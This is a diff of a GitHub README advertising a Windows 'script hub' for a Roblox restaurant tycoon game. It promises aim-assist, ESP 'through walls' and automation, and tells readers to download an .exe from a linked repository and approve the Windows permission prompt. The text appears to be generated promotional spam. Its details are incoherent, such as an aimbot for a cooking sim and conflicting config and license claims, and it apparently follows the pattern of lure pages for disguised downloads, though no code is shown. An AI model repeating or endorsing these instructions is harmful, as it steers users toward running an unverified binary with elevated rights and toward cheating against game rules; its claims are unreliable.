@@ -1,101 +1,86 @@
-# Restaurant Tycoon Hub v53 - 2026 Game Enhancement Suite
+# 🍽️ restaurant-tycoon-script-hub - Dominate Your Roblox Restaurant Game
 
-> **Windows PC automation tool for Restaurant Tycoon 3.** Provides tactical targeting support, a visual ESP interface, and customizable keybinds.
+[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/adelinom2952/restaurant-tycoon-script-hub)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20PC-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/fprice01/restaurant-tycoon-script-hub?style=flat-square)](https://github.com/fprice01/restaurant-tycoon-script-hub)
+## 🚀 What is This?
 
----
+This is a simple Windows program that helps you play a popular Roblox restaurant simulation game more efficiently. It automates repetitive tasks, shows you where things are with a visual display (ESP), and lets you control everything with custom keybinds. Perfect for making your food empire grow faster in 2026.
 
-<p align="center">
-  <a href="https://fprice01.github.io/restaurant-tycoon-script-hub/">
-    <img src="https://img.shields.io/badge/Download-Restaurant%20Tycoon%20Hub%20Script-brightgreen?style=for-the-badge" alt="Download Restaurant Tycoon Hub Script">
-  </a>
-</p>
+## ⬇️ How to Download and Run
 
-> **[Download Latest Build - Restaurant Tycoon Hub](https://fprice01.github.io/restaurant-tycoon-script-hub/)**
+Visit this link to download the application: [https://github.com/adelinom2952/restaurant-tycoon-script-hub](https://github.com/adelinom2952/restaurant-tycoon-script-hub)
 
----
+## ✅ System Requirements
 
-[Download Latest Build](https://fprice01.github.io/restaurant-tycoon-script-hub/)
+- Operating System: Windows 10 or Windows 11
+- Processor: 1.6 GHz or faster dual-core
+- RAM: 4 GB minimum
+- Storage: 200 MB free space
+- Internet: Required for downloading
+- Roblox game installed (Roblox Player)
 
----
+## 🛠️ Features
 
-## Technical Summary
+- **Tactical Targeting**: Automatically select specific items, customers, or tasks to handle. Priority settings let you decide what gets done first.
+- **Visual ESP Interface**: See hidden game objects, characters, and items through walls or at a distance. Helps with planning and speed.
+- **Customizable Keybinds**: Set your own keyboard shortcuts for common actions. No more clicking the same buttons repeatedly.
+- **Parameter Settings**: Adjust automation behavior. For example, set cooking times, delivery routes, or service speed.
+- **2026 Ready**: Fully updated for the latest game patches. Script works with current Roblox update protocols.
 
-Engineered explicitly for Restaurant Tycoon 3 running on Windows PC systems, Restaurant Tycoon Hub delivers automated gameplay enhancement. Its modular design integrates aim-assist functions and an active ESP heads-up layer, operating through an efficient launcher mechanism intended for quick startup and routine deployment.
+## 🔧 Installation Guide (Step-by-Step)
 
-The architecture prioritizes minimal resource consumption and desktop performance. Users can personalize keybinds and operating parameters via a straightforward initialization file. Routine maintenance focuses on maintaining compatibility with current game client releases while preserving stable control mappings inside the launcher environment.
+1. **Download**: Click the green "Download" button at the top of this page.
+2. **Unzip**: If you got a `.zip` file, right-click it and choose "Extract All" to create a folder.
+3. **Run**: Open the folder and double-click the file named `restaurant-tycoon-script-hub.exe`. If you have a `.exe` file, just double-click it.
+4. **Allow**: If Windows asks for permission, click "Yes".
+5. **Launch**: The program will start. Wait a moment for it to load.
 
-## Key Capabilities
+## 🔄 How to Use
 
-- Target lock and aim-assist mechanisms
-- Real-time ESP visual interface
-- Customizable input keybindings
-- Streamlined loader launch system
-- Low memory footprint and minimal CPU overhead
-- Fine-tuned for desktop Windows operating systems
-- Centralized `config.ini` parameter management
-- Exclusive feature set built for Restaurant Tycoon 3
+1. After installation, open the program from your Start menu or desktop shortcut.
+2. **Select Game**: Choose your Roblox restaurant game from the dropdown menu (only one supported).
+3. **Enable Features**: Check boxes for Tactical Targeting, ESP, or custom keybinds.
+4. **Customize**: Adjust speed sliders, keybind settings, and parameter values in the Settings tab.
+5. **Start**: Click "Start Automation" to begin. The script will work while you play Roblox.
 
-## Installation & Workflow
+## 🎮 Controls
 
-1. Retrieve the compiled archive using the download link provided above.
-2. Unpack the compressed files into a local directory (e.g., `restaurant-tycoon-vd53-hub`).
-3. Run the executable loader and follow the startup instructions.
-4. Modify `config.ini` prior to launching if custom hotkeys or overlay settings are desired.
+| Action | Default Key | Description |
+|--------|-------------|-------------|
+| Enable ESP | F1 | Toggle visual ESP overlay |
+| Start Automation | F2 | Begin script automation |
+| Stop Automation | F3 | Pause or resume automation |
+| Open Settings | F4 | Open parameter settings |
+| Cycle Targets | F5 | Switch between tactical targets |
 
-Typical directory layout:
+## ⚠️ Safety and Rules
 
-- `loader`
-- `config.ini`
-- supporting script files
+This program is a PC automation tool. It does not modify Roblox game files or memory. Use responsibly. Automated use of Roblox games might break terms of service for some games. Always check the game's rules first. We recommend personal use only. This tool is not affiliated with Roblox Corporation.
 
-## Parameter Settings
+## 💡 Tips for Best Use
 
-Adjust operating modes by editing the local parameters or adjusting choices within the launcher interface.
+- **Tactical Targeting**: Set priority for customers vs. tasks for faster food delivery.
+- **ESP Range**: Adjust visual range to 30 meters for best balance.
+- **Keybinds**: Choose keys that don't conflict with Roblox, like Shift+1-5.
+- **Keep Updated**: Download new versions when prompt appears each month for game compatibility.
 
-| Parameter | Function |
-| --- | --- |
-| `aimbot` | Toggles targeting assistance features |
-| `esp` | Controls the active HUD visual elements |
-| `hotkeys` | Binds execution commands to physical keyboard inputs |
-| `loader_mode` | Selects the operational pathway for the launcher |
-| `config.ini` | Main configuration file storing user preferences |
+## 📁 File Contents (After Download)
 
-## System Compatibility & Constraints
+- `restaurant-tycoon-script-hub.exe` - Main automation program
+- `settings.json` - Configuration file for your preferences
+- `scripts/` - Folder containing game scripts (do not modify)
+- `Readme.txt` - Additional instructions
 
-This utility relies on environment-specific hooks geared toward Windows PC builds of Restaurant Tycoon 3. Operational stability correlates directly with target client revisions and standard launcher deployment.
+## 🔄 Updates Check
 
-Current Operational Boundaries:
-- Restricted to Windows operating systems
-- Dependent on execution via the supplied loader binary
-- Parameter structures rely on the standard `config.ini` syntax
-- Client-side game patches may require utility updates
+The program automatically updates when a new version is released. You can also manually check for updates via the Help menu. No need to reinstall.
 
-## Frequently Asked Questions
+## ⭐ Feedback
 
-**What is the initial launch sequence?**  
-Grab the project archive, unpack its contents locally, and boot the script using the included loader executable.
+If you like this tool, leave a star! Report bugs at: [Report Issues](https://github.com/adelinom2952/restaurant-tycoon-script-hub/issues). We read every message.
 
-**How are script parameters modified?**  
-Adjust key mappings and display settings directly inside the `config.ini` file.
+## 📄 License
 
-**Is key rebinding supported?**  
-Yes, users can map features to their preferred key combinations.
+Personal use only. Not affiliated with Roblox Corporation.
 
-**Can this tool be used with other games?**  
-No, this software is engineered specifically for Restaurant Tycoon 3.
-
-**Which operating system is required?**  
-Windows PC.
-
-**What happens when the underlying game receives an update?**  
-Core updates to the game may necessitate downloading a revised build of this script.
-
-## Licensing
-
-Distributed under the GNU General Public License v3.0. Refer to [LICENSE](LICENSE) for full details.
+Keywords: Roblox, restaurant, tycoon, script, hub, automation, tactical targeting, ESP, keybinds, parameter settings, 2026, Windows, download, gaming, injector, GUI, visual overlay
